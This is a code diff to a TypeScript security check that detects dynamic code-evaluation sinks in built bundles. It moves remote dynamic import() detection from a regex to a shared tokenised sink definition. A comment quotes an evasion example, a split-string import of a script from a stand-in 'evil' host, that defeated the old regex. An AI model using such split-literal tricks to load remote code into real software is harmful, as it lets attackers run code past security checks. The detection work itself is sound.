@@ -12,8 +12,8 @@ import { join, resolve } from 'node:path';
 import {
   BUILT_CODE_SINKS,
   findDynamicCodeSinks,
+  REMOTE_DYNAMIC_IMPORT_SINK,
   type SinkSpec,
-  scanSourceForSinks,
 } from './dangerous-code-patterns.js';
 
 export const ROOT = resolve(import.meta.dirname, '..');
@@ -120,14 +120,21 @@ export function scanPublicGatewayEgress(
  */
 const ANY_IMPORT_SCRIPTS: SinkSpec = { name: 'importScripts', label: 'importScripts()' };
 
-export const DYNAMIC_REMOTE_CODE_PATTERNS: ReadonlyArray<{ pattern: RegExp; label: string }> = [
-  // The eval/Function-constructor/string-timer sinks come from the shared
-  // definition (`dangerous-code-patterns.ts`) so this gate, lint:security,
-  // check:sw, and check:update-channel cannot drift apart on what counts as
-  // runtime code evaluation — they previously all pinned only `new Function(`,
-  // leaving the equivalent bare `Function(` call open in every one of them.
-  // A dynamic import() of an http(s) URL string (remote code).
-  { pattern: /import\s*\(\s*['"`]https?:/i, label: 'dynamic import() of a remote URL' },
+/**
+ * Every sink this gate rejects, from the SHARED definitions so it cannot drift
+ * apart from lint:security / check:sw / check:update-channel on what counts as
+ * runtime code evaluation — they previously all pinned only `new Function(`,
+ * leaving the equivalent bare `Function(` call open in every one of them.
+ *
+ * The dynamic `import()` of a remote URL used to be a REGEX anchored on the
+ * scheme immediately after the opening quote, which a split literal
+ * (`import('ht' + 'tps://evil/x.js')`) walked straight past. It is a sink spec
+ * now, so the analyzer folds the specifier and covers every call spelling.
+ */
+const PRIVATE_BUNDLE_SINKS: readonly SinkSpec[] = [
+  ...BUILT_CODE_SINKS,
+  ANY_IMPORT_SCRIPTS,
+  REMOTE_DYNAMIC_IMPORT_SINK,
 ];
 
 export function scanDynamicRemoteCode(
@@ -140,13 +147,10 @@ export function scanDynamicRemoteCode(
     // `Function\n('x')` is an ordinary call a per-line scan can never see.
     // The shared, comment-blanking strip preserves offsets, so `findSinkMatches`
     // still reports the true source line.
-    for (const { label, line } of [
-      ...scanSourceForSinks(content, DYNAMIC_REMOTE_CODE_PATTERNS),
-      // The eval/Function/string-timer sinks are TOKENISED and walked rather
-      // than pattern-matched, so this gate covers every invocation spelling
-      // that lint:security and check:sw do, from the same definition.
-      ...findDynamicCodeSinks(content, [...BUILT_CODE_SINKS, ANY_IMPORT_SCRIPTS]),
-    ]) {
+    // Every sink is TOKENISED and walked rather than pattern-matched, so this
+    // gate covers exactly the invocation spellings lint:security and check:sw
+    // do, from the same definitions.
+    for (const { label, line } of findDynamicCodeSinks(content, PRIVATE_BUNDLE_SINKS)) {
       violations.push({ file: path, line, detail: label });
     }
   }
